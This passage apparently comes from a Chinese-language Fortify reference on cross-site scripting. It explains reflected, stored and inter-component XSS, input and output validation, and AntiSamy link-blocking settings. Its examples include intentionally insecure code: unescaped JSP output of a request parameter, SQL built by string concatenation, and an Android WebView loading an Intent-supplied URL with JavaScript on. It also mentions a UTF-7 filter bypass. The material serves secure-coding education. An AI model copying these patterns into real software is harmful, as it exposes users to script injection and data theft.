<p>— 系统从 HTTP 请求中直接读取数据，并在 HTTP 响应中返回数据。当攻击者诱使用户为易受攻击的 Web 应用程序提供危险内容，而这些危险内容随后会反馈给用户并在 Web 浏览器中执行，就会发生反射式 XSS 盗取。发送恶意内容最常用的方法是，把恶意内容作为一个参数包含在公开发表的 URL 中，或者通过电子邮件直接发送给受害者。以这种手段构造的 URL 构成了多种“网络钓鱼”(phishing) 阴谋的核心，攻击者借此诱骗受害者访问指向易受攻击站点的 URL。站点将攻击者的内容反馈给受害者以后，便会执行这些内容，接下来会把用户计算机中的各种私密信息（比如包含会话信息的 cookie）传送给攻击者，或者执行其他恶意活动。</p>
<p>— 应用程序将危险数据存储在数据库或其他可信赖的数据存储器中。这些危险数据随后会被回写到应用程序中，并包含在动态内容中。Persistent XSS 盗取发生在如下情况：攻击者将危险内容注入到数据存储器中，且该存储器之后会被读取并包含在动态内容中。从攻击者的角度看，注入恶意内容的最佳位置莫过于一个面向许多用户，尤其是相关用户显示的区域。相关用户通常在应用程序中具备较高的特权，或相互之间交换敏感数据，这些数据对攻击者来说有利用价值。如果某一个用户执行了恶意内容，攻击者就有可能以该用户的名义执行某些需要特权的操作，或者获得该用户个人所有的敏感数据的访问权限。</p>
<p>— 应用程序之外的数据源将危险数据储存在一个数据库或其他数据存储器中，随后这些危险数据被当作可信赖的数据回写到应用程序中，并储存在动态内容中。</p>
<h5 id="RECOMMENDATIONS-257"><a href="#RECOMMENDATIONS-257" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 XSS 的解决方法是，确保在适当位置进行验证，并检验其属性是否正确。</p>
<p>由于 XSS 漏洞出现在应用程序的输出中包含恶意数据时，因此，合乎逻辑的做法是在数据流出应用程序的前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。</p>
<p>由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储或其他可信赖的数据源接受输入，而该数据存储所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。</p>
<p>针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，在写入代码时，这些字符仍应被视为合法的输入，比如一个 Web 设计版就必须接受带有 HTML 代码片段的输入。</p>
<p>更灵活的解决方法称为黑名单方法，但其安全性较差，这种方法在进行输入之前就有选择地拒绝或避免了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：</p>
<p>在有关块级别元素的内容中（位于一段文本的中间）：</p>
<p>－“&lt;”是一个特殊字符，因为它可以引入一个标签。</p>
<p>－“&amp;”是一个特殊字符，因为它可以引入一个字符实体。</p>
<p>－“&gt;”是一个特殊字符，之所以某些浏览器将其认定为特殊字符，是基于一种假设，即该页的作者本想在前面添加一个“&lt;”，却错误地将其遗漏了。</p>
<p>下面的这些原则适用于属性值：</p>
<p>－ 对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。</p>
<p>-“&amp;”与某些特定变量一起使用时是特殊字符，因为它引入了一个字符实体。</p>
<p>例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以点击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：</p>
<p>－ 空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。</p>
<p>-“&amp;”是特殊字符，因为它可引入一个字符实体或分隔 CGI 参数。</p>
<p>－ 非 ASCII 字符（即 ISO-8859-1 编码表中所有高于 128 的字符）不允许出现在 URL 中，因此在此上下文中也被视为特殊字符。</p>
<p>－ 在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的“%”符号。例如，当输入中出现“%68%65%6C%6C%6F”时，只有从输入的内容中过滤掉“%”，上述字符串才能在网页上显示为“hello”。</p>
<p>在 <code>&lt;SCRIPT&gt; &lt;/SCRIPT&gt;</code>的正文内：</p>
<ul>
<li>如果可以将文本直接插入到已有的脚本标签中，应该过滤掉分号、省略号、中括号和换行符。</li>
</ul>
<p>服务器端脚本：</p>
<p>－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (“)，则可能需要对此进行更多过滤。</p>
<p>其他可能出现的情况：</p>
<p>－ 如果攻击者在 UTF-7 中提交了一个请求，那么特殊字符“&lt;”可能会显示为“+ADw-”，并可能会绕过过滤。如果输出包含在没有确切定义编码格式的网页中，有些浏览器就会设法根据内容自动识别编码（此处采用 UTF-7 格式）。</p>
<p>一旦在应用程序中确定了针对 XSS 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符，下一个难点就是定义验证过程中处理各种特殊字符的方式。如果应用程序认定某些特殊字符为无效输入，那么您可以拒绝任何带有这些无效特殊字符的输入。第二种选择就是采用过滤手段来删除这些特殊字符。然而，过滤的负面作用在于，过滤内容的显示将发生改变。在需要完整显示输入内容的情况下，过滤的这种负面作用可能是无法接受的。</p>
<p>如果必须接受带有特殊字符的输入，并将其准确地显示出来，验证机制一定要对所有特殊字符进行编码，以便删除其具有的含义。官方的 HTML 规范 [2] 提供了特殊字符对应的 ISO 8859-1 编码值的完整列表。</p>
<p>许多应用程序服务器都试图避免应用程序出现 Cross-Site Scripting 漏洞，具体做法是为负责设置特定 HTTP 响应内容的函数提供各种实现方式，以检验是否存在进行 Cross-Site Scripting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-256"><a href="#REFERENCES-256" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Understanding Malicious Content Mitigation for Web Developers CERT</p>
<p>[2] HTML 4.01 Specification W3</p>
<p>[3] INJECT-3: XML and HTML generation requires care Oracle</p>
<p>[4] INPUT-1: Validate inputs Oracle</p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 79, CWE ID 80</p>
<p>[6] Standards Mapping - FIPS200 SI</p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting</p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS)</p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS)</p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS)</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7</p>
<p>[19] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 079</p>
<p>[20] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 079</p>
<p>[21] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 079</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[32] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting</p>
<p>[33] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08)</p>
<h4 id="Cross-Site-Scripting-External-Links"><a href="#Cross-Site-Scripting-External-Links" class="headerlink" title="Cross-Site Scripting: External Links"></a>Cross-Site Scripting: External Links</h4><h5 id="ABSTRACT-258"><a href="#ABSTRACT-258" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>向一个 Web 浏览器发送未经验证的数据会导致该浏览器执行恶意代码。配置中的设置可最大限度降低暴露 cross-site scripting 漏洞的可能性。</p>
<h5 id="EXPLANATION-259"><a href="#EXPLANATION-259" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Cross-Site Scripting (XSS) 漏洞在以下情况下发生：</p>
<ol>
<li><p>数据通过一个不可信赖的资源进入 Web 应用程序，通常是一个网页请求或者数据库。</p>
</li>
<li><p>未检验包含在动态内容中的数据，便将其传送给了 Web 用户。</p>
</li>
</ol>
<p>传送到 Web 浏览器的恶意内容通常采用 JavaScript 代码片段的形式，但也可能会包含一些 HTML、Flash 或者其他任意一种可以被浏览器执行的代码。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。</p>
<p>由于针对 XSS 漏洞进行的攻击通常涉及到与受攻击者控制的恶意站点进行通信或需要重新定向到该站点，因此注入对其他域内容引用的能力在诸多攻击中必不可少。可对 AntiSamy 进行配置，使其阻止指向外部域的链接，进而降低攻击者可通过 XSS 攻击造成的破坏。然而，这种保护只能解决部分问题，并不能解决由 XSS 漏洞带来的整体威胁。</p>
<p>例 1：以下 AntiSamy 配置条目允许链接至在应用程序所运行的域之外的 URL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;attribute name=&quot;href&quot; onInvalid=&quot;filterTag&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;regexp-list&gt;</span><br><span class="line"></span><br><span class="line">		&lt;regexp name=&quot;onsiteURL&quot;/&gt;</span><br><span class="line"></span><br><span class="line">		&lt;regexp name=&quot;offsiteURL&quot;/&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/regexp-list&gt;</span><br><span class="line"></span><br><span class="line">&lt;/attribute&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-258"><a href="#RECOMMENDATIONS-258" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>无论什么时候，应尽可能阻止引用了外部域的链接。</p>
<p>例 2：以下 AntiSamy 配置条目禁止链接至在应用程序所运行的域之外的 URL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;attribute name=&quot;href&quot; onInvalid=&quot;filterTag&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;regexp-list&gt;</span><br><span class="line"></span><br><span class="line">		&lt;regexp name=&quot;onsiteURL&quot;/&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/regexp-list&gt;</span><br><span class="line"></span><br><span class="line">&lt;/attribute&gt;</span><br></pre></td></tr></table></figure>
<p>由于 XSS 漏洞出现在应用程序的输出中包含恶意数据时，因此，合乎逻辑的做法是在数据流出应用程序的前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。</p>
<p>由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储或其他可信赖的数据源接受输入，而该数据存储所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。</p>
<p>针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，在写入代码时，这些字符仍应被视为合法的输入，比如一个 Web 设计版就必须接受带有 HTML 代码片段的输入。</p>
<p>更灵活的解决方法称为黑名单方法，但其安全性较差，这种方法在进行输入之前就有选择地拒绝或避免了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：</p>
<p>在有关块级别元素的内容中（位于一段文本的中间）：</p>
<p>－ “&lt;” 是一个特殊字符，因为它可以引入一个标签。</p>
<p>－ “&amp;” 是一个特殊字符，因为它可以引入一个字符实体。</p>
<p>－ “&gt;” 是一个特殊字符，之所以某些浏览器将其认定为特殊字符，是基于一种假设，即该页的作者本想在前面添加一个 “&lt;“，却错误地将其遗漏了。</p>
<p>下面的这些原则适用于属性值：</p>
<p>－ 对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。</p>
<p>－ ”&amp;” 与某些特定变量一起使用时是特殊字符，因为它引入了一个字符实体。</p>
<p>例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以点击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：</p>
<p>－ 空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。</p>
<p>－ “&amp;” 是特殊字符，因为它可引入一个字符实体或分隔 CGI 参数。</p>
<p>－ 非 ASCII 字符（即 ISO-8859-1 编码表中所有高于 128 的字符）不允许出现在 URL 中，因此在此上下文中也被视为特殊字符。</p>
<p>－ 在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的 “%” 符号。例如，当输入中出现 “%68%65%6C%6C%6F” 时，只有从输入的内容中过滤掉 “%“，上述字符串才能在网页上显示为 “hello”。</p>
<p>在 <code>&lt;SCRIPT&gt; &lt;/SCRIPT&gt;</code>的正文内：</p>
<p>－ 如果可以将文本直接插入到已有的脚本标签中，应该过滤掉分号、省略号、中括号和换行符。</p>
<p>服务器端脚本：</p>
<p>－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (”)，则可能需要对此进行更多过滤。</p>
<p>配置文件可用来缩小攻击者可用来实施攻击的攻击面。</p>
<p>例 1：以下 AntiSamy 配置文件禁止在 href 中设置异地 URL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;attribute name=&quot;href&quot; onInvalid=&quot;filterTag&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;regexp-list&gt;</span><br><span class="line"></span><br><span class="line">		&lt;regexp name=&quot;onsiteURL&quot;/&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/regexp-list&gt;</span><br><span class="line"></span><br><span class="line">&lt;/attribute&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-257"><a href="#REFERENCES-257" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Understanding Malicious Content Mitigation for Web Developers CERT</p>
<p>[2] HTML 4.01 Specification W3</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 79, CWE ID 82, CWE ID 83, CWE ID 87, CWE ID 692</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-18 Mobile Code (P2)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS)</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS)</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS)</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7</p>
<p>[17] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[18] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 079</p>
<p>[19] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 079</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002490 CAT I, APSC-DV-003300 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002490 CAT I, APSC-DV-003300 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002490 CAT I, APSC-DV-003300 CAT II</p>
<p>[30] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08)</p>
<h4 id="Cross-Site-Scripting-Inter-Component-Communication"><a href="#Cross-Site-Scripting-Inter-Component-Communication" class="headerlink" title="Cross-Site Scripting: Inter-Component Communication"></a>Cross-Site Scripting: Inter-Component Communication</h4><h5 id="ABSTRACT-259"><a href="#ABSTRACT-259" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>向一个 Web 浏览器发送未经验证的数据会导致该浏览器执行恶意代码。</p>
<h5 id="EXPLANATION-260"><a href="#EXPLANATION-260" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Cross-Site Scripting (XSS) 漏洞在以下情况下发生：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入 Web 或移动应用程序。在组件间通信 XSS 的情况下，不可信赖的数据是从驻留在同一系统上的其他组件接收的数据。在移动应用中，这是指运行在同一设备中的应用程序。对于 Reflected XSS，不可信赖的源通常为 Web 请求，而对于 Persisted（也称为 Stored）XSS，该源通常为数据库或其他后端数据存储。</p>
</li>
<li><p>未检验包含在动态内容中的数据，便将其传送给了 Web 用户。</p>
</li>
</ol>
<p>传送到 Web 浏览器的恶意内容通常采用 JavaScript 代码片段的形式，但也可能会包含一些 HTML、Flash 或者其他任意一种可以被浏览器执行的代码。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。</p>
<p>有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 cross-site scripting）是无意义的 – 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。</p>
<p>示例 1：以下代码在 Android WebView 中启用了 JavaScript（默认情况下，JavaScript 为禁用状态），并根据从 Android Intent 接收到的值加载页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        WebView webview = (WebView) findViewById(R.id.webview);</span><br><span class="line"></span><br><span class="line">        webview.getSettings().setJavaScriptEnabled(true);</span><br><span class="line"></span><br><span class="line">        String url = this.getIntent().getExtras().getString(&quot;url&quot;);</span><br><span class="line"></span><br><span class="line">        webview.loadUrl(url);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果 url 的值以 javascript: 开头，则接下来的 JavaScript 代码将在 WebView 中的 Web 页面上下文内部执行。</p>
<p>示例 2：以下 JSP 代码片段可从 HTTP 请求中读取雇员 ID eid，并将其显示给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;% String eid = request.getParameter(&quot;eid&quot;); %&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Employee ID: &lt;%= eid %&gt;</span><br></pre></td></tr></table></figure>
<p>如果 eid 只包含标准的字母或数字文本，这个例子中的代码就能正确运行。如果 eid 里有包含元字符或源代码中的值，那么 Web 浏览器就会像显示 HTTP 响应那样执行代码。</p>
<p>起初，这个例子似乎是不会轻易遭受攻击的。毕竟，有谁会输入导致恶意代码的 URL，并且还在自己的电脑上运行呢？真正的危险在于攻击者会创建恶意的 URL，然后采用电子邮件或者社会工程的欺骗手段诱使受害者访问此 URL 的链接。当受害者单击这个链接时，他们不知不觉地通过易受攻击的网络应用程序，将恶意内容带到了自己的电脑中。这种对易受攻击的 Web 应用程序进行盗取的机制通常被称为反射式 XSS。</p>
<p>示例 3：以下 JSP 代码片段可在数据库中查询具有给定 ID 的雇员，并输出相应雇员姓名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%...</span><br><span class="line"></span><br><span class="line">Statement stmt = conn.createStatement();</span><br><span class="line"></span><br><span class="line">ResultSet rs = stmt.executeQuery(&quot;select * from emp where id=&quot;+eid);</span><br><span class="line"></span><br><span class="line">if (rs != null) &#123;</span><br><span class="line"></span><br><span class="line">   rs.next();</span><br><span class="line"></span><br><span class="line">   String name = rs.getString(&quot;name&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Employee Name: &lt;%= name %&gt;</span><br></pre></td></tr></table></figure>
<p>如同例 2，如果对 name 的值处理得当，该代码就能正常地执行各种功能；如若处理不当，就会对代码的盗取行为无能为力。同样，这段代码暴露出的危险较小，因为 name 的值是从数据库中读取的，而且显然这些内容是由应用程序管理的。然而，如果 name 的值是由用户提供的数据产生，数据库就会成为恶意内容沟通的通道。如果不对数据库中存储的所有数据进行恰当的输入验证，那么攻击者就可以在用户的 Web 浏览器中执行恶意命令。这种类型的 Persistent XSS（也称为 Stored XSS）盗取极其阴险狡猾，因为数据存储导致的间接性使得辨别威胁的难度增大，而且还提高了一个攻击影响多个用户的可能性。XSS 盗取会从访问提供留言簿 (guestbook) 的网站开始。攻击者会在这些留言簿的条目中嵌入 JavaScript，接下来所有访问该留言簿的用户都会执行这些恶意代码。</p>
<p>正如例子中所显示的，XSS 漏洞是由于 HTTP 响应中包含了未经验证的数据代码而引起的。受害者遭受 XSS 攻击的途径有三种：</p>
<p>— 正如例 1 所示，应用程序之外的数据源将危险数据储存在一个数据库或其他数据存储器中，随后这些危险数据被当作可信赖的数据回写到应用程序中，并存储在动态内容中。</p>
<p>－ 如例 2 所述，系统从 HTTP 请求中直接读取数据，并在 HTTP 响应中返回数据。当攻击者诱使用户为易受攻击的 Web 应用程序提供危险内容，而这些危险内容随后会反馈给用户并在 Web 浏览器中执行，就会发生反射式 XSS 盗取。发送恶意内容最常用的方法是，把恶意内容作为一个参数包含在公开发表的 URL 中，或者通过电子邮件直接发送给受害者。以这种手段构造的 URL 构成了多种“网络钓鱼”(phishing) 阴谋的核心，攻击者借此诱骗受害者访问指向易受攻击站点的 URL。站点将攻击者的内容反馈给受害者以后，便会执行这些内容，接下来会把用户计算机中的各种私密信息（比如包含会话信息的 cookie）传送给攻击者，或者执行其他恶意活动。</p>
<p>－ 如例 3 所述，应用程序将危险数据储存在一个数据库或其他可信赖的数据存储器中。这些危险数据随后会被回写到应用程序中，并包含在动态内容中。Persistent XSS 盗取发生在如下情况：攻击者将危险内容注入到数据存储器中，且该存储器之后会被读取并包含在动态内容中。从攻击者的角度看，注入恶意内容的最佳位置莫过于一个面向许多用户，尤其是相关用户显示的区域。相关用户通常在应用程序中具备较高的特权，或相互之间交换敏感数据，这些数据对攻击者来说有利用价值。如果某一个用户执行了恶意内容，攻击者就有可能以该用户的名义执行某些需要特权的操作，或者获得该用户个人所有的敏感数据的访问权限。</p>
<p>许多现代 Web 框架都提供对用户输入执行验证的机制。其中包括 Struts 和 Struts 2。为了突出显示未经验证的输入源，Fortify 安全编码规则包会降低 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题被利用的可能性，并在使用框架验证机制时提供相应的依据，以动态重新调整问题优先级。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队提供了数据验证项目模板，该模板会根据应用于输入源的验证机制，将问题分组到多个文件夹中。</p>
